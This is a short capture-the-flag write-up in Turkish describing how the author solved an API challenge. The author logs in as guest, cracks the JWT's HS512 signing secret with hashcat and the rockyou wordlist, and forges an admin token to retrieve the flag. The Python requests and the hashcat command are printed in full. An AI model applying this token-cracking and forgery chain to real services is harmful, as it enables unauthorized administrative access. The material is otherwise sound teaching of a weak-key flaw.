Siteye girdigimde Authorization basliginin olmadigini soyluyor.

{"Error":"Authorization header not found! Try to login with guest credentials."}

Challange'in aciklamasi 'Frontend is overrated! API rocks!' oldugu icin herhangi bir gorsel form beklemiyordum.

API mantigiyla login page olabilecek sayfalara istek gondermeye basladim.

/login 'i denedigimde method hatasi verdi. Bu istekleri GET method'u ile gonderiyordum.

Post methodu ile gondermeyi deneyince username-password eksik hatasi aldim.

Giris sayfasinda misafir olarak giris yapabilirsiniz dedigi icin kucuk bi yazdim.

```python

#!/usr/bin/python3

import requests as r

data = { 
    "username":"guest",
    "password":"guest"
}

req_post = r.post("http://dctf1-chall-secure-api.westeurope.azurecontainer.io:8080/login", data=data)


```

{"Token":"Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjIxMDQ0NDQ0fQ.180L-byLhnxs-HLuiOHVc7ZlJukDeQn5C1Ll6LE6Tg95cVy5gnwNkAmoMBkSodggLWGyI4cvrJ5m4EuOA_r6Jg"}

Istegim bana JWT token dondurmustu. Online jwt tool araci ile decode ettigimde  

{
  "typ": "JWT",
  "alg": "HS512"
}
{
  "username": "guest",
  "exp": 1621043197
}

icerisinde username parametresinin oldugunu gordum.

Token uzerinde degisiklik yapabilmek icin Token'in imza sifresine ihtiyacim vardi.

Challange'in aciklamasinda 'rocks' geciyordu. Rockyou.txt ile deode etmeyi denedim.

```bash

hashcat -m 16500 hash /usr/share/wordlists/rockyou.txt

```

cok uzun surmeden crack islemini bitirdi ve imza sifresini verdi.

147852369

bu sifre ile Token'deki username kismini admin ile degistirip, sitenin header'ina Authorization ekleyip gonderdim.

```python

import requests as r

header = {
    "Authorization":"Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjIxMDQzMTk3fQ.it7Lbwt35DTecQd7DpZZKpk4qDomCBwoXSaZYtoHK-8Hp4X1PDv2CRVwFrLemhtDlf1t1v72ScEt0IaZdjEFKw"
}

req_get = r.get("http://dctf1-chall-secure-api.westeurope.azurecontainer.io:8080", headers= header)

print(req_get.text)

```

Ve bana sifreyi verdi.

{"Message":"Hi, admin! I have a secret for you.","Secret":"dctf{w34k_k3y5_4r3_n0t_0k4y}"}


-Jb3lp0is